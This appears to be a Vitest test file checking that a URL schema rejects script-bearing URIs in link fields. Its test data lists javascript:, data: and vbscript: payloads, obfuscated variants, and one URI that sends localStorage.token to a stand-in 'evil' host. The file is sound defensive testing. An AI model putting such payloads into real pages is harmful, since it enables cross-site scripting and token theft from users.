/**
 * URL fields in the API contract are rendered as links, so the schema must
 * reject the script-bearing URIs that `z.string().url()` used to accept.
 *
 * Before this guard, `z.string().url()` accepted `javascript:alert(1)`,
 * `data:text/html,…` and `vbscript:…` — all valid URLs that run or render
 * script when the resulting `<a href>` is clicked.
 */
import { describe, expect, it } from 'vitest';
import { isHttpUrl, httpUrlSchema } from '../src/url.js';
import { provenanceSchema } from '../src/index.js';
import { announcementEntrySchema } from '../src/sources.js';

const DANGEROUS = [
  'javascript:alert(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'vbscript:msgbox(1)',
  '  javascript:alert(1)', // a browser trims leading whitespace before parsing
  'java\tscript:alert(1)', // …and strips embedded control characters
  '\njavascript:alert(1)',
  'JavaScript:alert(1)',
  '/relative/path',
  'ftp://host/file',
  'mailto:x@example.test',
];

const SAFE = ['https://vtu.ac.in/x', 'http://example.test/path?q=1', 'HTTPS://Example.test'];

describe('isHttpUrl', () => {
  it('rejects every script-bearing or non-http(s) URI', () => {
    for (const url of DANGEROUS) expect(isHttpUrl(url), url).toBe(false);
  });
  it('accepts ordinary http(s) URLs, case-insensitively', () => {
    for (const url of SAFE) expect(isHttpUrl(url), url).toBe(true);
  });
});

describe('httpUrlSchema', () => {
  it('parses a safe URL and rejects a javascript: URI', () => {
    expect(httpUrlSchema.safeParse('https://ok.example').success).toBe(true);
    expect(httpUrlSchema.safeParse('javascript:alert(1)').success).toBe(false);
  });
});

describe('URL fields that become links', () => {
  it('provenance.sourceUrl rejects a javascript: URI', () => {
    const base = { sourceClause: null, verifiedAt: '2026-01-01', verifiedBy: null };
    expect(provenanceSchema.safeParse({ ...base, sourceUrl: 'https://vtu.ac.in' }).success).toBe(
      true,
    );
    expect(provenanceSchema.safeParse({ ...base, sourceUrl: 'javascript:alert(1)' }).success).toBe(
      false,
    );
  });

  it('an announcement entry rejects a javascript: canonicalUrl but accepts a real one', () => {
    const base = { publisher: 'VTU', title: 'Notice', category: 'results' as const };
    expect(
      announcementEntrySchema.safeParse({ ...base, canonicalUrl: 'https://vtu.ac.in/notice' })
        .success,
    ).toBe(true);
    expect(
      announcementEntrySchema.safeParse({
        ...base,
        canonicalUrl: 'javascript:fetch("//evil/"+localStorage.token)',
      }).success,
    ).toBe(false);
  });
});
